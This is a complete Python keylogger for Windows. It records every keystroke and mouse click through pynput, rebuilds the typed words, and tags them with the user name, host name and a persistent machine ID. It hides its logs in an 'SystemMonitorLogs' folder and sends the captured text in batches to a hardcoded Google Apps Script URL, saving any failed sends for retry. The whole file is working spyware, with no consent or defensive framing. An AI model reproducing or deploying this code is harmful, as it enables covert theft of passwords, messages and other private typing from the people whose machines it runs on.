import logging
import requests
import os
import threading
import queue
import socket
import getpass
import time
import uuid
import json
import ctypes
import atexit
from pynput import keyboard, mouse

# --- Configuration ---
WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzuY47OfBLTy2ld-u5pRHOrK9QEjI_A9PInGgOBbI1_iAx0r6skl49ZJjlAB0RAgEHXNg/exec"
INACTIVITY_TIMEOUT = 2.0
BATCH_SEND_INTERVAL = 1.0
MIN_BUFFER_LENGTH = 1

class KeyLogger:
    def __init__(self):
        self.user = getpass.getuser()
        self.hostname = socket.gethostname()
        self.log_dir = self._setup_directories()
        self.uuid = self._get_or_create_uuid()
        self.unsent_file = os.path.join(self.log_dir, "unsent.json")
        
        self.send_queue = queue.Queue()
        self.word_buffer = []
        self.lock = threading.Lock()
        self.shift_pressed = False
        self.last_keypress_time = time.time()
        self.stop_event = threading.Event()
        
        logging.basicConfig(
            filename=os.path.join(self.log_dir, "app_log.txt"),
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s"
        )
        atexit.register(self.cleanup)

    def _setup_directories(self):
        app_data = os.getenv('APPDATA') or os.path.expanduser("~")
        path = os.path.join(app_data, "SystemMonitorLogs")
        os.makedirs(path, exist_ok=True)
        return path

    def _get_or_create_uuid(self):
        uuid_path = os.path.join(self.log_dir, "id.txt")
        if os.path.exists(uuid_path):
            with open(uuid_path, "r") as f:
                return f.read().strip()
        new_id = str(uuid.uuid4())
        with open(uuid_path, "w") as f:
            f.write(new_id)
        return new_id

    def _is_caps_lock_on(self):
        return ctypes.windll.user32.GetKeyState(0x14) & 1

    def send_payload(self, batch):
        data = {
            "words": batch,
            "user": self.user,
            "host": self.hostname,
            "machine_uuid": self.uuid,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        try:
            resp = requests.post(WEB_APP_URL, json=data, timeout=5)
            if resp.status_code == 200:
                logging.info(f"Sent {len(batch)} items.")
                return True
        except Exception as e:
            logging.error(f"Send failed: {e}")
        self._save_unsent(data)
        return False

    def _save_unsent(self, data):
        try:
            with open(self.unsent_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(data) + "\n")
        except Exception as e:
            logging.error(f"Could not save unsent data: {e}")

    def sender_worker(self):
        batch = []
        while not self.stop_event.is_set():
            try:
                while True:
                    item = self.send_queue.get(timeout=BATCH_SEND_INTERVAL)
                    batch.append(item)
                    if len(batch) >= 10: 
                        break
            except queue.Empty:
                pass
            if batch:
                self.send_payload(batch)
                batch = []

    def flush_monitor(self):
        while not self.stop_event.is_set():
            time.sleep(0.5)
            with self.lock:
                if self.word_buffer and (time.time() - self.last_keypress_time > INACTIVITY_TIMEOUT):
                    self._flush_buffer()

    def _flush_buffer(self):
        """Helper to safely move buffer to queue."""
        if self.word_buffer:
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            text = "".join(self.word_buffer)
            if len(text) >= MIN_BUFFER_LENGTH:
                # FIXED: Prepend single quote to force spreadsheet text format
                self.send_queue.put({"word": "'" + text, "timestamp": ts})
            self.word_buffer = []

    def on_click(self, x, y, button, pressed):
        """Detects mouse clicks to handle cursor movement corrections."""
        if pressed:
            self.last_keypress_time = time.time()
            with self.lock:
                # If user clicks, they are likely moving the cursor.
                # Flush current word so it doesn't merge with the new location's text.
                self._flush_buffer()
                # We don't need a quote for [CLICK] marker, but consistent formatting is fine.
            

    def on_press(self, key):
        try:
            self.last_keypress_time = time.time()
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            
            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                self.shift_pressed = True
                return

            char_to_log = None
            
            # Accurate Numpad Handling
            if hasattr(key, 'vk') and key.vk is not None:
                if 96 <= key.vk <= 105:
                    char_to_log = str(key.vk - 96)
                elif key.vk == 110: char_to_log = "."
                elif key.vk == 106: char_to_log = "*"
                elif key.vk == 107: char_to_log = "+"
                elif key.vk == 109: char_to_log = "-"
                elif key.vk == 111: char_to_log = "/"

            if char_to_log is None:
                if hasattr(key, 'char') and key.char:
                    is_upper = self._is_caps_lock_on() != self.shift_pressed
                    char_to_log = key.char.upper() if is_upper else key.char.lower()
                elif key == keyboard.Key.space:
                    char_to_log = " "
                elif key == keyboard.Key.enter:
                    with self.lock:
                        self._flush_buffer()
                    self.send_queue.put({"word": "[ENTER]", "timestamp": ts})
                    return
                elif key == keyboard.Key.backspace:
                    with self.lock:
                        if self.word_buffer:
                            self.word_buffer.pop()
                    return

            if char_to_log:
                with self.lock:
                    self.word_buffer.append(char_to_log)
        except Exception as e:
            logging.error(f"Key error: {e}")

    def on_release(self, key):
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            self.shift_pressed = False

    def start(self):
        t1 = threading.Thread(target=self.sender_worker, daemon=True)
        t2 = threading.Thread(target=self.flush_monitor, daemon=True)
        t1.start()
        t2.start()
        
        # Start both Keyboard and Mouse listeners
        with mouse.Listener(on_click=self.on_click) as m_listener:
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as k_listener:
                m_listener.join()
                k_listener.join()

    def cleanup(self):
        self.stop_event.set()
        with self.lock:
            self._flush_buffer()
        
        final_batch = []
        while not self.send_queue.empty():
            try:
                final_batch.append(self.send_queue.get_nowait())
            except queue.Empty:
                break
        if final_batch:
            self.send_payload(final_batch)

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()